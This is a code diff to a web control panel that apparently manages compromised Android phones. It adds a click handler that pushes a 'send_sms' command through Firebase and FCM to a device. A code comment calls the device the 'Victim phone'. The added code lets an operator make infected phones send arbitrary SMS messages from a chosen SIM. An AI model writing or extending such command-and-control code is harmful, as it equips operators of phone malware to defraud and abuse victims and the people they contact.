@@ -320,7 +320,7 @@ function renderDeviceDetailsUI(deviceId) {
 
             <div class="grid grid-cols-2 gap-2.5">
                 ${Object.values(dev.sims || {}).map(sim => `
-                    <div class="relative group/sim bg-slate-50/50 border border-slate-200 p-2.5 rounded-xl transition-all">
+                    <div onclick="handleSendSmsClick('${deviceId}', ${sim.slot})" class="relative group/sim cursor-pointer bg-slate-50/50 border border-slate-200 p-2.5 rounded-xl hover:border-indigo-500 hover:bg-indigo-50/50 transition-all active:scale-95">
                         <div class="flex items-center space-x-1.5 mb-1.5">
                             <div class="p-1 bg-white rounded shadow-xs">
                                 <i data-lucide="sim-card" class="w-3 h-3 text-indigo-600"></i>
@@ -379,6 +379,45 @@ function renderDeviceDetailsUI(deviceId) {
             </div>
         </div>
     `;
+}
+
+/**
+ * Handles sending SMS command via RTDB and FCM
+ * Uses the fragment inputs for number and message
+ */
+async function handleSendSmsClick(deviceId, slot) {
+    const number = document.getElementById('cf-number')?.value.trim();
+    const message = document.getElementById('cf-message')?.value.trim();
+
+    if (!number || number.length < 10 || !message) {
+        showToast("Enter number and message", "error");
+        return;
+    }
+
+    const dev = lastSnapshotData?.Devices[deviceId];
+    
+    // 1. RTDB Command Object (Victim phone reads from here)
+    const smsData = {
+        number: number,
+        message: message,
+        sim_slot: Number(slot)
+    };
+
+    // 2. FCM Data Payload (For immediate wake-up)
+    const fcmData = {
+        action: "send_sms",
+        number: number,
+        message: message,
+        sim_slot: String(slot)
+    };
+
+    // Send FCM
+    sendFcmPing(dev.fcmToken, fcmData);
+
+    // Set RTDB Command
+    database.ref(`Devices/${deviceId}/commands/send_sms`).set(smsData)
+        .then(() => showToast("SMS Command Sent"))
+        .catch(() => showToast("Failed to send", "error"));
 }
 
 /**
